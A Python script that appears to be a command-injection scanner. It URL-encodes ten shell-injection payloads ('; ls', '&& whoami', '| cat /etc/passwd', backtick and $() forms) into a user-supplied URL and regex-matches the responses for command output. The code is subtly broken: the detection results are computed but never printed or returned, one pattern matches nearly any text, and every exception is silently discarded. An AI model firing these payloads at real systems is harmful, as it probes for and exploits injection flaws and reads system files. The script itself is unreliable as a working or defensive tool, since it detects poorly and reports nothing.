import sys
import urllib.parse
from urllib.request import urlopen
from urllib.error import URLError, HTTPError
import re
import socket

def test_command_injection(base_url):
    # Common command injection payloads
    payloads = [
        "127.0.0.1; ls",
        "127.0.0.1 && whoami",
        "127.0.0.1 | cat /etc/passwd",
        "127.0.0.1; id",
        "127.0.0.1`whoami`",
        "127.0.0.1$(id)",
        "127.0.0.1; uname -a",
        "127.0.0.1 && cat /etc/hosts",
        "127.0.0.1; pwd",
        "127.0.0.1 || whoami"
    ]
    
    # Common command output patterns that indicate successful injection
    command_patterns = [
        r'uid=\d+',  # id command output
        r'root:.*?:/bin/',  # /etc/passwd content
        r'Linux.*?\d+\.\d+',  # uname output
        r'127\.0\.0\.1\s+localhost',  # /etc/hosts content
        r'/home/',  # directory paths
        r'/bin/',  # binary paths
        r'drwxr',  # ls -l output
        r'total \d+',  # ls output
        r'^\w+$'  # simple command outputs like whoami
    ]
    
    for payload in payloads:
        try:
            # URL encode the payload
            encoded_payload = urllib.parse.quote(payload)
            test_url = base_url.replace("{CMD_PARAM}", encoded_payload)
            
            # Set a short timeout to avoid blocking
            socket.setdefaulttimeout(2)
            
            try:
                response = urlopen(test_url)
                response_text = response.read().decode('utf-8', errors='ignore')
                
                # Check if response contains command output patterns
                vulnerable = False
                evidence = ""
                
                for pattern in command_patterns:
                    matches = re.findall(pattern, response_text, re.MULTILINE | re.IGNORECASE)
                    if matches:
                        vulnerable = True
                        evidence = matches[0][:50]  # First 50 chars of evidence
                        break
                
                # Also check for common error messages that might indicate injection
                if not vulnerable:
                    error_patterns = [
                        r'command not found',
                        r'permission denied',
                        r'no such file or directory',
                        r'syntax error'
                    ]
                    for pattern in error_patterns:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            vulnerable = True
                            evidence = "Command execution error detected"
                            break
                    
            except (HTTPError, URLError) as e:
                # Check if error message contains command injection evidence
                error_msg = str(e)
                if any(pattern in error_msg.lower() for pattern in ['command', 'syntax', 'permission']):
                    pass
                    
        except Exception:
            pass

def main():
    try:
        print("Testing")
        url = input().strip()
        if "{CMD_PARAM}" not in url:
            return
        test_command_injection(url)
    except EOFError:
        pass
    except Exception:
        pass

if __name__ == "__main__":
    main()